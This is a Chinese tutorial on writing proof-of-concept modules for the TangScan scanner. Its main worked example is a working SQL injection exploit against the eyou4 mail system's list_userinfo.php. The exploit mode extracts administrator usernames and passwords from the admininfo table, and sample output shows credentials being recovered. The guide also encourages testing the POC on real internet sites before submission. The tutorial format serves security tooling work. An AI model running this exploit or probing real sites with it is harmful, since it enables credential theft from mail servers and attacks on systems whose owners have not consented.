==================
快速入门
==================

简介
=============
该文档能够帮助您快速的理解 **TangScan** 中 POC 的格式, 以及编写一个简单完整的 POC , 下面就让我们开始这一段旅程。




环境配置
=============
工欲善其事必先利其器, 在开发 POC 之前, 首先应该把环境搭建起来。

1. POC 由 python 编写, 所以 python 也是必不可少的, `python下载地址 <https://www.python.org/downloads/>`_
2. 下载地址 ::

    $ git clone https://github.com/wooyun/TangScan.git

   或者点击 `下载 <https://github.com/WooYun/TangScan/archive/master.zip>`_

3. 进入编写 POC 的工作目录 ::

    cd TangScan/tangscan

4. 希望POC编写者能够遵循 python  `pep8 规范 <http://legacy.python.org/dev/peps/pep-0008/>`_


编写POC
==============
下面我们以 ``http://www.wooyun.org/bugs/wooyun-2014-058014`` 中的 eyou4 的 ``/php/bill/list_userinfo.php`` 注入为例子,
开始编写这个漏洞的 POC 。

导入
-------------
.. code-block:: python
    :linenos:

    #! /usr/bin/env python
    # -*- coding: utf-8 -*-

    import re
    import hashlib

    from thirdparty import requests
    from modules.exploit import TSExploit

代码解释::

    line 4: 为了能够匹配网页内容, 我们需要import re
    line 5: 为了能够计算md5，我们需要import hashlib
    line 7: TangScan 还自带了一些比较好用的第三方库, 在这里我们import requests来处理http请求
    line 8: 编写TangScan POC不可缺少的一个类 TSExploit


定义TangScan类
------------------
.. code-block:: python
    :linenos:

    class TangScan(TSExploit):
        ... ...

代码解释::

    line 1: 定义TangScan类, 并且继承于TSExploit


填写漏洞信息
-------------------
.. code-block:: python
    :linenos:

    def __init__(self):
        super(self.__class__, self).__init__()
        self.info = {
            "name": "eyou4 list_userinfo.php sql 注入漏洞",  # POC 的名称
            "product": "eyou",  # POC 所针对的应用, 在 tangscan 主页上展示出所有的应用
                                # 名称必须和 tangscan 主页上的一致(大小写敏感)
            "product_version": "4",  # 应用版本号
            "desc": """
                eyou4 邮件系统中 /php/bill/list_userinfo.php 中的 cp 参数存在注入
            """,  # 漏洞描述
            "license": self.license.TS,  # POC 的版权信息
            "author": ["wooyun"],  # POC 编写者
            "ref": [
                {self.ref.wooyun: "http://www.wooyun.org/bugs/wooyun-2014-058014"},  # 乌云案例链接
            ],
            "type": self.type.sql_injection,  # 漏洞类型, 在详细介绍中列举了所有 POC 的类型
            "severity": self.severity.medium,  # 漏洞的危害等级, 在详细介绍中列举了所有 POC 的危害等级
            "privileged": False,  # 是否需要登录
            "disclosure_date": "2014-07-23",  # 漏洞的公布时间
            "create_date": "2014-09-23",  # POC创建时间
        }

代码解释::

    line 1: 定义TangScan中 __init__ 方法
    line 2: 调用父类 __init__ 方法
    line 3: 定义 info 属性, info 是 python 中一个字典类型
    line 10: 选择POC的版权信息, 在 self.license 中已经定义了几种license
    line 15: 漏洞类型, 在 self.type 中已经定义了几种type

* `self.license <detail.html#license>`_
* `self.type <detail.html#type>`_
* `self.severity <detail.html#severity>`_


注册POC所需选项
-----------------
然后继续在 ``__init__`` 方法下继续调用 ``register_option`` 方法, 该方法用于注册 POC 所需参数。

.. code-block:: python
    :linenos:

        self.register_option({
            "url": {
                "default": "",
                "required": True,
                "choices": [],
                "convert": self.convert.url_field,
                "desc": "target url"
            }
        })


代码解释::

    line 1: 调用 regsiter_option 方法注册所需参数
    line 2: 我们所需的参数是 url
    line 3: 设置参数 url 的默认值为 ""
    line 4: 设置参数 url 是否是必要参数
    line 5: 设置参数 url 的可选值, []为无可选值
    line 6: 设置参数 url 的类型, TangScan会判断以及自动将参数url转成POC中的url类型
            例如: www.example.com 转换成 http://www.example.com
    line 7: 设置参数 url 的描述, 这会在帮助中显示


另外需要注意的是在 ``verify`` 中只能使用 ``url`` 或者  ``host`` 和 ``port`` 选项。

也就是说, ``register_option`` 必须注册 ``url`` :

.. code-block:: python
    :linenos:

        self.register_option({
            "url": {
                "default": "",
                "required": True,
                "choices": [],
                "convert": self.convert.url_field,
                "desc": "target url"
            }
        })


或者 注册 ``host`` 和 ``port``:

.. code-block:: python
    :linenos:

        self.register_option({
            "host": {
                "default": "",
                "required": True,
                "choices": [],
                "convert": self.convert.str_field,
                "desc": "target host"
            },
            "port": {
                "default": "27017",
                "required": False,
                "choices": [],
                "convert": self.convert.int_field,
                "desc": "port number"
            }
        })


而且, 除了 ``host`` 和 ``port`` 参数, 其他参数必须将 required 设置为 False


注册POC所返回的结果
------------------------
然后继续在 ``__init__`` 方法下继续调用 ``register_result`` 方法, 该方法用于注册 POC 所返回的结果。

.. code-block:: python
    :linenos:

        self.register_result({
            "status": False,
            "data": {
                "user_info": {
                    "username": "",
                    "password": ""
                }
            },
            "description": "",
            "error": ""
        })

代码解释::

    line 1: 调用 register_result 方法注册POC返回结果
    line 2: POC 的成功失败状态, 必须
    line 3: POC 返回数据的存放处，必须名为 data, 而且data中的键都在 数据返回表 中已定义
    line 4: POC 的exploit模式将返回管理员用户名密码, 所以data下填写user_info
    line 5: POC 将返回 user_info 的 username
    line 6: POC 将返回 user_info 的 password
    ilne 9: POC 返回对人类可读性良好的信息, 最终会直接显示在漏洞报表中
    line 10: POC 执行失败或者异常的原因


定义verify方法
-------------------------
经过上面一些步骤, 我们已经填写好了 POC 的相关信息, 定义了输入和输出, 下面我们就来到了 POC 中一个极为重要的执行体 ``verify`` 方法。
``verify`` 顾名思义, 仅做验证目标网站是否存在漏洞, 不应存在恶意攻击行为, 不应该使用waf敏感的函数, 例如 mysql 中的 ``load_file`` 或 ``into outfile`` 等。
``verify`` 方法中只能使用 ``url`` 或者 ``host`` 和 ``port`` 做组合 两种类型作为输入参数。

.. code-block:: python
    :linenos:

    def verify(self):
        self.print_debug("verify start")

        re_version_pattern = re.compile(r'~~~(.+?)~~~', re.IGNORECASE | re.DOTALL | re.MULTILINE)
        cookies = {'cookie': 'admin'}
        exp_url = ("{domain}/php/bill/list_userinfo.php?domain=fatezero.org&ok=1&cp=1 union "
                   "select concat(0x7e7e7e,@@version,0x7e7e7e),2,3,4,5%23".format(domain=self.option.url))

        try:
            response = requests.get(exp_url, cookies=cookies, timeout=15, verify=False)
        except Exception, e:
            self.result.error = str(e)
            return

        re_result = re_version_pattern.findall(response.content)
        if len(re_result) == 0:
            self.result.status = False
            return

        self.result.status = True
        self.result.data.db_info.version = re_result[0]
        self.result.description = "目标 {url} 存在sql注入, 目标使用数据库版本为: {db_version}".format(
            url=self.option.url,
            db_version=re_result[0]
        )


代码解释::

    line 1: 定义 verify 方法
    line 2: 调用 print_debug 方法输出调试信息, 在选择调试模式下, 会将此消息输出
    line 7: self.option.url 就是我们所定义输入的 url , 在这里可以获取用户在命令行输入的 url
            例如: 使用 self.option.xxx 就可以获取在命令行输入的 xxx 的值
    line 20: self.result.status 就是我们所定义输出的 status, 检测目标url存在漏洞, 设置 self.result.status ＝ True
            例如: 使用 self.result.xxx 就可以获取或设置result 的结果
    line 22: 设置 result.description, 最终会在报表中直接显示



定义exploit方法
-------------------------
经过上一步, 我们完成了 ``verify`` 方法的实现, 下面我们继续实现 ``exploit`` 方法。
``exploit`` 方法带着攻击意图, 为了获取管理员信息, 直接获取服务器权限等, 能够方便的让安全服务人员使用。

.. code-block:: python
    :linenos:

    def exploit(self):
        self.print_debug("exploit start")

        re_userinfo_pattern = re.compile(r'~~~(\w+?)\|\|\|(\w+?)~~~', re.IGNORECASE | re.DOTALL | re.MULTILINE)
        cookies = {'cookie': 'admin'}
        exp_url = ("{domain}/php/bill/list_userinfo.php?domain=fatezero.org&ok=1&cp=1 union select concat(0x7e7e7e,"
                   "oid,0x7c7c7c,password,0x7e7e7e),2,3,4,5 from admininfo%23".format(domain=self.option.url))

        try:
            response = requests.get(exp_url, cookies=cookies, timeout=15, verify=False)
        except Exception, e:
            self.result.error = str(e)
            return

        re_result = re_userinfo_pattern.findall(response.content)
        if len(re_result) == 0:
            self.result.status = False
            return

        self.result.status = True
        self.result.data.user_info.username = re_result[0][0]
        self.result.data.user_info.password = re_result[0][1]
        self.result.description = "目标 {url} 存在sql注入, 目标管理员用户: {username}, 密码: {password}".format(
            url=self.option.url,
            username=self.result.data.user_info.username,
            password=self.result.data.user_info.password
        )


代码解释::

    line 1: 定义 exploit 方法
    line 2: 调用 print_debug 方法输出调试信息, 在选择调试模式下, 会将此消息输出
    line 4: 建立获取user_info的正则表达式, 建议在敏感信息周边加上特殊符号以便于正则获取, 也可以大程度减少误报
    line 15: 使用正则获取html页面中的信息
    line 20: 获取到敏感信息之后, 将status设置为 True
    line 21: 通过self.result.data.user_info.username = re_result[0][0] 可以很简单的设置结果中的username
    line 22: 通过self.resutl.data.user_info.password = re_result[0][1] 可以很简单的设置结果中的password


如果 ``exploit`` 和 ``verify`` 一样, 那么可以简单的这样做。

.. code-block:: python
    :linenos:

    def verify(self):
        # some code
        # ... ...

    def exploit(self):
        self.verify()

main入口
---------------
终于到了这一步, 我们只要简单的将这3行代码放到文件的最底处即可。

.. code-block:: python
    :linenos:

    if __name__ == '__main__':
        from modules.main import main
        main(TangScan())


代码解释::

    line 2: 导入 main 函数
    line 3: 执行 main 函数, 以TangScan的一个实例为参数

到这里, 我们完完整整的实现了一个POC, 带有verify模式和exploit模式的POC, 完整代码在 `github <https://github.com/WooYun/TangScan/blob/master/tangscan/eyou4_list_userinfo_sql_injection.py>`_ 。


执行POC
=======================

帮助信息
-----------------------
执行POC前, 我们先看一下POC的帮助信息。

.. code-block:: sh

    $ python eyou4_list_userinfo_sql_injection.py -h
    usage: eyou4_list_userinfo_sql_injection.py [-h] [--debug]
                                                [--mode {verify,exploit}] --url
                                                URL

    optional arguments:
      -h, --help            show this help message and exit
      --debug               显示测试信息
      --mode {verify,exploit}
                            POC 执行模式, default: verify [str_filed]
      --url URL             目标 url [url_field]

上面我们可以看到 ``-h`` 帮助参数, ``--debug`` 调试参数, ``--mode`` 执行模式, ``--url`` 目标url 。
其中 ``-h --debug --mode`` 都是系统附加, ``--url`` 是我们 POC 自己定义, 并且从上面信息可以看到 url 参数类型是 ``url_field``

执行信息
-------------------------
好了, 写了那么久, 总应该执行看一下效果了

.. code-block:: sh

    $ python eyou4_list_userinfo_sql_injection.py --url http://www.target.com --mode exploit
    [POC 编写者]
        ['wooyun']
    [风险]
        目标 http://www.target.com 存在 eyou4 list_userinfo.php sql 注入漏洞
    [详细说明]
        eyou4 邮件系统中 /php/bill/list_userinfo.php 中的 cp 参数存在注入
    [程序返回]
        目标 http://www.target.com 存在sql注入, 用户: admin, 密码: password
    [危害等级]
        高
    [漏洞类别]
        注入
    [相关引用]
        * 乌云案例: http://www.wooyun.org/bugs/wooyun-2014-058014

攻击模式执行成功!!! 我们获取到了目标网站的管理员账号密码。

提交POC
=========================
既然都那么辛苦的写完了, 为什么不去提交一下呢? 在提交前希望能在互联网上找到几个实际例子进行测试, 确认 POC 没有误报的情况。

提交地址: `http://www.tangscan.com/ <http://www.tangscan.com/>`_



